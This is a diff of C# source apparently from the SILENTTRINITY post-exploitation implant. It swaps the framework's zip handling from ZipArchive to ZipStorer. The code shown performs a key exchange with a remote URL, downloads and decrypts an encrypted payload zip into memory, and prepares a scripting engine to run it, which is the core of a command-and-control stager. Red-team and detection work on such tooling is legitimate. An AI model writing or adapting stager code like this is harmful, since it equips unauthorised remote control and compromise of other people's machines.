@@ -22,9 +22,9 @@ namespace SILENTTRINITY
     public class ST
     {
         static Guid GUID = Guid.NewGuid();
-        static Uri URL = null;
+        static Uri URL;
         // TODO: Migrate to ZipStorer
-        static ZipArchive Stage = null;
+        static ZipStorer Stage;
 
         static ST()
         {
@@ -82,21 +82,18 @@ namespace SILENTTRINITY
             }
         }
 
-        public static Byte[] GetResourceInZip(ZipArchive zip, string resourceName)
+        public static byte[] GetResourceInZip(ZipStorer zip, string resourceName)
         {
-            foreach (var entry in zip.Entries)
+            foreach (var entry in zip.ReadCentralDir())
             {
-                if (entry.Name == resourceName)
+                if (entry.FilenameInZip == resourceName)
                 {
 #if DEBUG
                 Console.WriteLine("Found {0} in zip", resourceName);
 #endif
-                    using (var resource = entry.Open())
-                    {
-                        var resdata = new Byte[entry.Length];
-                        resource.Read(resdata, 0, resdata.Length);
-                        return resdata;
-                    }
+                    var resdata = new byte[entry.FileSize];
+                    zip.ExtractFile(entry, out resdata);
+                    return resdata;
                 }
             }
             throw new Exception(String.Format("{0} not in zip file", resourceName));
@@ -293,7 +290,7 @@ namespace SILENTTRINITY
 #endif
                 byte[] key = ECDHKeyExchange(URL);
                 byte[] encrypted_zip = HttpGet(URL);
-                Stage = new ZipArchive(new MemoryStream(Decrypt(key, encrypted_zip)));
+                Stage = ZipStorer.Open(new MemoryStream(Decrypt(key, encrypted_zip)), FileAccess.ReadWrite, true);
             }
 
             try
@@ -359,7 +356,7 @@ namespace SILENTTRINITY
                 {
                     byte[] key = ECDHKeyExchange(URL);
                     byte[] encrypted_zip = HttpGet(URL);
-                    Stage = new ZipArchive(new MemoryStream(Decrypt(key, encrypted_zip)));
+                    Stage = ZipStorer.Open(new MemoryStream(Decrypt(key, encrypted_zip)), FileAccess.ReadWrite, true);
                 }
 
                 var scope = engine.CreateScope();
